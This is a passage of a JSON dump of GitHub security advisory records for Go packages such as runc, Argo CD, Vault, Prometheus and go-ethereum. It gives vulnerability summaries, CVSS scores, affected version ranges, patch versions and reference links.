"2020-12-28T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-28r2-q6m8-9hpx", "modified": "2022-11-21T19:45:07Z", "published": "2022-05-26T00:01:27Z", "aliases": ["CVE-2022-30323"], "summary": "HashiCorp go-getter unsafe downloads could lead to asymmetric resource exhaustion", "details": "HashiCorp go-getter through 2.0.2 does not safely perform downloads. Asymmetric resource exhaustion could occur when go-getter processed malicious HTTP responses.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/s3/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter/gcs/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30323"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/359"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/361"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/38e97387488f5439616be60874979433a12edb48"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/a2ebce998f8d4105bd4b78d6c99a12803ad97a45"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-13-multiple-vulnerabilities-in-go-getter-library/"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-13-multiple-vulnerabilities-in-go-getter-library/39930"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/go-getter"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/releases"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0586"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-06-01T21:21:26Z", "nvd_published_at": "2022-05-25T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vjj6-5m9f-wqjw", "modified": "2022-05-25T19:23:25Z", "published": "2022-05-25T19:23:25Z", "aliases": ["CVE-2021-43667"], "summary": "NULL Pointer Dereference in HyperLedger Fabric", "details": "A vulnerability has been detected in HyperLedger Fabric v1.4.0, v2.0.0, v2.1.0. This bug can be leveraged by constructing a message whose payload is nil and sending this message with the method 'forwardToLeader'. This bug has been admitted and fixed by the developers of Fabric. If leveraged, any leader node will crash.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43667"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/2838/commits/ebf94b10ecc86d3a91619b98befc52277b1e3474"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/2844"}, {"type": "WEB", "url": "https://jira.hyperledger.org/browse/FAB-18529"}, {"type": "PACKAGE", "url": "github.com/hyperledger/fabric"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-05-25T19:23:25Z", "nvd_published_at": "2021-11-18T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4j5x-f394-xx79", "modified": "2023-07-13T17:04:33Z", "published": "2022-05-24T22:01:30Z", "aliases": ["CVE-2021-29417"], "summary": "gitjacker arbitrary code execution", "details": "gitjacker before 0.1.0 allows remote attackers to execute arbitrary code via a crafted .git directory because of directory traversal.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/liamg/gitjacker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29417"}, {"type": "WEB", "url": "https://github.com/liamg/gitjacker/compare/v0.0.3...v0.1.0"}, {"type": "WEB", "url": "https://github.com/liamg/gitjacker/releases/tag/v0.1.0"}, {"type": "WEB", "url": "https://vuln.ryotak.me/advisories/5"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-07-13T17:04:33Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f3fp-gc8g-vw66", "modified": "2023-03-27T22:23:50Z", "published": "2022-05-24T17:36:56Z", "aliases": ["CVE-2022-29162"], "summary": "Default inheritable capabilities for linux container should be empty", "details": "### Impact\n\nA bug was found in runc where `runc exec --cap` executed processes with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during execve(2).\n\nThis bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.\n\n### Patches\nThis bug has been fixed in runc 1.1.2. Users should update to this version as soon as possible.\n\nThis fix changes `runc exec --cap` behavior such that the additional capabilities granted to the process being executed (as specified via `--cap` arguments) do not include inheritable capabilities.\n\nIn addition, `runc spec` is changed to not set any inheritable capabilities in the created example OCI spec (`config.json`) file.\n\n### Credits\nThe opencontainers project would like to thank [Andrew G. Morgan](https://github.com/AndrewGMorgan) for responsibly disclosing this issue in accordance with the [opencontainers org security policy](https://github.com/opencontainers/.github/blob/master/SECURITY.md).\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/opencontainers/runc/issues/new)\n* Email us at [security@opencontainers.org](mailto:security@opencontainers.org) if you think you\u2019ve found a security bug", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/runc/security/advisories/GHSA-f3fp-gc8g-vw66"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29162"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/d04de3a9b72d7a2455c1885fc75eb36d02cd17b5"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/releases/tag/v1.1.2"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AVPZBV7ISA7QKRPTC7ZXWKMIQI2HZEBB/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/D77CKD3AXPMU4PMQIQI5Q74SI4JATNND/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/GPQU4YC4AAY54JDXGDQHJEYKSXXG5T2Y/"}, {"type": "PACKAGE", "url": "github.com/opencontainers/runc"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-24T17:36:56Z", "nvd_published_at": "2022-05-17T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-752c-vfpf-cp2w", "modified": "2023-07-10T23:44:00Z", "published": "2022-05-24T22:01:28Z", "aliases": ["CVE-2021-27940"], "summary": "openark/orchestrator cross-site scripting vulnerability", "details": "resources/public/js/orchestrator.js in openark orchestrator before 3.2.4 allows XSS via the orchestrator-msg parameter.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/openark/orchestrator"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.2.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-27940"}, {"type": "WEB", "url": "https://github.com/openark/orchestrator/pull/1313"}, {"type": "WEB", "url": "https://github.com/openark/orchestrator/commit/76ceb6b0e013e1e815eb008dec90295860b06cf3"}, {"type": "WEB", "url": "https://github.com/openark/orchestrator/releases/tag/v3.2.4"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-10T23:44:00Z", "nvd_published_at": "2021-03-03T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6gcg-hp2x-q54h", "modified": "2022-05-23T21:13:57Z", "published": "2022-05-23T21:13:57Z", "aliases": ["CVE-2022-24904"], "summary": "Symlink following allows leaking out-of-bound manifests and JSON files from Argo CD repo-server", "details": "### Impact\n\nAll unpatched versions of Argo CD starting with v0.7.0 are vulnerable to a symlink following bug allowing a malicious user with repository write access to leak sensitive files from Argo CD's repo-server.\n\nA malicious Argo CD user with write access for a repository which is (or may be) used in a directory-type Application may commit a symlink which points to an out-of-bounds file. \n* If the target file is a valid JSON or YAML manifest file, and the resource is allowed in the Application, the attacker can read the contents of that manifest file. (In versions <2.3.2, <2.2.8, and <2.1.14, the attacker may read the files contents even if the resource is _not_ allowed in the Application). \n* If the target file is valid JSON but is _not_ a manifest file, the attacker may read the contents of the file. \n* If the target file is not valid JSON or YAML, the attacker may read partial file contents (usually just the first character of the file).\n\nSensitive files which could be leaked include manifest files from other Applications' source repositories (potentially decrypted files, if you are using a decryption plugin) or any JSON-formatted secrets which have been mounted as files on the repo-server.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.4\n* v2.2.9\n* v2.1.15\n\n### Workarounds\n\n* If you are using >=v2.3.0 and do not have any Jsonnet/directory-type Applications, [disable the Jsonnet/directory config management tool](https://argo-cd.readthedocs.io/en/stable/user-guide/tool_detection/#disable-built-in-tools). The config key is called `jsonnet.enable` since the same build tool is used for both Jsonnet and plain-manifest (\"directory\") sources.\n\n#### Mitigations\n\n* Avoid mounting JSON-formatted secrets as files on the repo-server.\n* Upgrade to >=2.3.0 to significantly reduce the risk of leaking out-of-bounds manifest files. Starting with 2.3.0, repository paths are randomized, and read permissions are restricted when manifests are not being actively being generated. This makes it very difficult to craft and use a malicious symlink.\n* Upgrade to >=2.3.3, >=2.2.8, or >= 2.1.14 to significantly reduce the risk of leaking the contents of (but not the existence of) out-of-bounds manifest files. These versions prevent attackers from loading manifests which are not permitted in the Project which governs the Application. \n\n#### Best practices which can mitigate risk\n\n* Limit who has push access to manifest repositories.\n* Limit who is allowed to configure new source repositories.\n* Limit resource kinds and destinations allowed for Projects, and restrict user access to only the necessary Projects.\n\n### Credits\n\nThis vulnerability was originally discovered as part of the Trail of Bits audit, published March 12, 2021. The behavior was left unchanged at the time.\n\nThe vulnerability was independently re-discovered by @crenshaw-dev, who contributed the patch. A security audit by Ada Logics independently followed up on the Trail of Bits report around the same time.\n\n### References\n\n* List of [types of Applications](https://argo-cd.readthedocs.io/en/stable/user-guide/application_sources/), including directory-type\n* [RBAC documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/), showing how to limit repository permissions\n* [Project documentation](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/), showing how to limit allowable resource kinds and destinations \n\n### For more information\nOpen an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.1.15"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0"}, {"fixed": "2.3.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-6gcg-hp2x-q54h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24904"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/5e767a4b9e30983330c0fdec322192281a90eb84"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/7357cfdb58a560de70a0538c6e3bef6fe39505ea"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/d36d95dc9f71ec61c1a93794f81ece6d61a0d943"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.1.15"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.2.9"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/releases/tag/v2.3.4"}, {"type": "PACKAGE", "url": "github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-59", "CWE-61"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-23T21:13:57Z", "nvd_published_at": "2022-05-20T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p5gc-957x-gfw9", "modified": "2023-10-02T10:57:31Z", "published": "2022-05-14T03:01:31Z", "aliases": ["CVE-2018-12018"], "summary": "Go Ethereum LES protocol implementation vulnerable to Denial of Service", "details": "The GetBlockHeadersMsg handler in the LES protocol implementation in Go Ethereum (aka geth) before 1.8.11 may lead to an access violation because of an integer signedness error for the array index, which allows attackers to launch a Denial of Service attack by sending a packet with a -1 query.Skip value. The vulnerable remote node would be crashed by such an attack immediately, aka the EPoD (Ethereum Packet of Death) issue.\n\n### Specific Go Packages Affected\ngithub.com/ethereum/go-ethereum/les", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.11"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-12018"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/pull/16891"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/commit/a5237a27eaf81946a3edb4fafe13ed6359d119e4"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://github.com/ethereum/go-ethereum/releases/tag/v1.8.11"}, {"type": "WEB", "url": "https://peckshield.com/2018/06/27/EPoD/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0075"}, {"type": "WEB", "url": "https://web.archive.org/web/20180628022133/https://peckshield.com/2018/06/27/EPoD/"}], "database_specific": {"cwe_ids": ["CWE-129"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T00:28:02Z", "nvd_published_at": "2018-07-05T02:29:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xj7v-c82w-92q2", "modified": "2023-10-05T19:26:09Z", "published": "2022-05-24T17:13:55Z", "aliases": ["CVE-2018-21034"], "summary": "Argo Exposure of Sensitive Information ", "details": "In Argo versions prior to v1.5.0-rc1, it was possible for authenticated Argo users to submit API calls to retrieve secrets and other manifests which were stored within git.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.0-rc1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-21034"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/issues/470"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/pull/3088"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/commit/916d4aed5775fead4ab75f47c1d352cd0e73b815"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/blob/a1afe44066fcd0a0ab90a02a23177164bbad42cf/util/diff/diff.go#L399"}, {"type": "WEB", "url": "https://www.soluble.ai/blog/argo-cves-2020"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-19T23:58:11Z", "nvd_published_at": "2020-04-09T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c5wc-v287-82pc", "modified": "2022-08-10T23:48:09Z", "published": "2022-05-18T00:00:32Z", "aliases": ["CVE-2022-30689"], "summary": "HashiCorp Vault improper configuration of multi factor authentication", "details": "HashiCorp Vault and Vault Enterprise from 1.10.0 to 1.10.2 did not correctly configure and enforce MFA on login after server restarts. This affects the Login MFA feature introduced in Vault and Vault Enterprise 1.10.0 and does not affect the separate Enterprise MFA feature set. Fixed in 1.10.3.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-30689"}, {"type": "WEB", "url": "https://github.com/hashicorp/vault/commit/15baea5fa3e71c837c33b8bcbd8f06e0fbbc110d"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault/"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202207-01"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20220629-0006/"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-25T19:35:56Z", "nvd_published_at": "2022-05-17T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j2h2-cvwh-cr64", "modified": "2023-07-18T13:40:24Z", "published": "2022-05-24T17:21:17Z", "aliases": ["CVE-2020-14457"], "summary": "Mattermost Server Sensitive Data Exposure", "details": "An issue was discovered in Mattermost Server before 5.20.0. Non-members can receive broadcasted team details via the `update_team` WebSocket event, aka MMSA-2020-0012.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.20.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14457"}, {"type": "WEB", "url": "https://github.com/mattermost/mattermost/pull/13848"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-18T13:40:24Z", "nvd_published_at": "2020-06-19T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4wpp-w5r4-7v5v", "modified": "2022-05-24T20:55:22Z", "published": "2022-05-24T20:55:22Z", "aliases": ["CVE-2022-29180"], "summary": "Server-Side Request Forgery in charm", "details": "We've discovered a vulnerability in which attackers could forge HTTP requests to manipulate the `charm` data directory to access or delete anything on the server. This has been patched in https://github.com/charmbracelet/charm/commit/3c90668f955c7ce5ef721e4fc9faee7053232fd3 and is available in release [v0.12.1](https://github.com/charmbracelet/charm/releases/tag/v0.12.1). We recommend that all users running self-hosted `charm` instances update immediately.\n\nThis vulnerability was found in-house and we haven't been notified of any potential exploiters.\n\n### Additional notes\n\n* Encrypted user data uploaded to the Charm server is safe as Charm servers cannot decrypt user data. This includes filenames, paths, and all key-value data.\n* Users running the official Charm [Docker images](https://github.com/charmbracelet/charm/blob/main/docker.md) are at minimal risk because the exploit is limited to the containerized filesystem.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open a [discussion](https://github.com/charmbracelet/charm/discussions)\n* Email us at [vt100@charm.sh](mailto:vt100@charm.sh)\n* Chat with us on [Slack](https://charm.sh/slack)\n\n* * *\n\n<a href=\"https://charm.sh/\"><img alt=\"the Charm logo\" src=\"https://stuff.charm.sh/charm-badge.jpg\" width=\"400\"></a>\n\nCharm\u70ed\u7231\u5f00\u6e90 \u2022 Charm loves open source", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/charmbracelet/charm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "0.12.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/charmbracelet/charm/security/advisories/GHSA-4wpp-w5r4-7v5v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29180"}, {"type": "WEB", "url": "https://github.com/charmbracelet/charm/commit/3c90668f955c7ce5ef721e4fc9faee7053232fd3"}, {"type": "PACKAGE", "url": "https://github.com/charmbracelet/charm"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-05-24T20:55:22Z", "nvd_published_at": "2022-05-07T04:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4v48-4q5m-8vx4", "modified": "2022-12-05T22:02:05Z", "published": "2022-12-05T22:01:08Z", "aliases": [], "summary": "Prometheus vulnerable to basic authentication bypass", "details": "### Impact\n\nPrometheus can be secured by a web.yml file that specifies usernames and hashed passwords for basic authentication.\n\nPasswords are hashed with bcrypt, which means that even if you have access to the hash, it is very hard to find the original password back.\n\nHowever, a flaw in the way this mechanism was implemented in the [exporter toolkit](https://github.com/prometheus/exporter-toolkit) makes it possible with people who know the hashed password to authenticate against Prometheus.\n\nA request can be forged by an attacker to poison the internal cache used to cache the computation of hashes and make subsequent requests successful. This cache is used in both happy and unhappy scenarios in order to limit side channel attacks that could tell an attacker if a user is present in the file or not.\n\n### Patches\n\nPrometheus 2.37.4 ([LTS](https://prometheus.io/docs/introduction/release-cycle/)) and 2.40.4 have been released to address this issue.\n\n### Workarounds\n\nThere is no workaround but attacker must have access to the hashed password, stored in disk, to bypass the authentication.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prometheus/prometheus"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.24.1"}, {"fixed": "2.37.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/prometheus/prometheus"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.38.0"}, {"fixed": "2.40.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/prometheus/prometheus/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.24.1"}, {"fixed": "2.37.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/prometheus/prometheus/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.38.0"}, {"fixed": "2.40.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/prometheus/prometheus/security/advisories/GHSA-4v48-4q5m-8vx4"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/commit/31a2db3ae9c0f4b486b6895973beabc1d1beac93"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/releases/tag/v2.37.4"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/releases/tag/v2.40.4"}, {"type": "PACKAGE", "url": "github.com/prometheus/prometheus"}], "database_specific": {"cwe_ids": ["CWE-303"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-05T22:01:08Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p228-4mrh-ww7r", "modified": "2022-12-30T16:57:11Z", "published": "2022-12-30T16:57:11Z", "aliases": ["CVE-2022-46173"], "summary": "Elrond-GO processing: fallback search of SCRs when not found in the main cache", "details": "### Impact\nProcessing issue, nodes are affected when trying to process a cross-shard relayed transaction with a smart contract deploy transaction data. The problem was a bad correlation between the transaction caches and the processing component. If the above-mentioned transaction was sent with more gas than required, the smart contract result (SCR transaction) that should have returned the leftover gas, would have been wrongly added to a cache that the processing unit did not consider. The node stopped notarizing metachain blocks. The fix was actually to extend the SCR transaction search in all other caches if it wasn't found in the correct (expected) sharded-cache. \n\n### Patches\nAll versions >= v1.3.50 will contain this patch\n\n### Workarounds\nFor the moment there is no workaround\n\n### References\nN/A\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [elrond-go main repo](https://github.com/ElrondNetwork/elrond-go)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ElrondNetwork/elrond-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.50"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.3.48"}}], "references": [{"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/security/advisories/GHSA-p228-4mrh-ww7r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-46173"}, {"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/pull/4718"}, {"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/commit/39d7ddcb08bb34217dab6daef7cd9d287fb8cab3"}, {"type": "PACKAGE", "url": "https://github.com/ElrondNetwork/elrond-go"}], "database_specific": {"cwe_ids": ["CWE-669"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T16:57:11Z", "nvd_published_at": "2022-12-28T07:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-68gw-r2x5-7r5r", "modified": "2023-06-27T20:24:50Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4686"], "summary": "usememos/memos Authorization Bypass Through User-Controlled Key vulnerability", "details": "Authorization Bypass Through User-Controlled Key in GitHub repository usememos/memos prior to 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4686"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/dca35bde877aab6e64ef51b52e590b5d48f692f9"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/caa0b22c-501f-44eb-af65-65c315cd1637"}], "database_specific": {"cwe_ids": ["CWE-639"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T16:27:38Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xxfx-w2rw-gh63", "modified": "2022-12-14T14:06:08Z", "published": "2022-12-14T00:30:23Z", "aliases": ["CVE-2022-43996"], "summary": "csaf-poc/csaf_distribution Cross-site Scripting vulnerability", "details": "The csaf_provider package before 0.8.2 allows XSS via a crafted CSAF document uploaded as text/html. The endpoint upload allows valid CSAF advisories (JSON format) to be uploaded with Content-Type text/html and filenames ending in .html. When subsequently accessed via web browser, these advisories are served and interpreted as HTML pages. Such uploaded advisories can contain JavaScript code that will execute within the browser context of users inspecting the advisory.", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/csaf-poc/csaf_distribution"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43996"}, {"type": "WEB", "url": 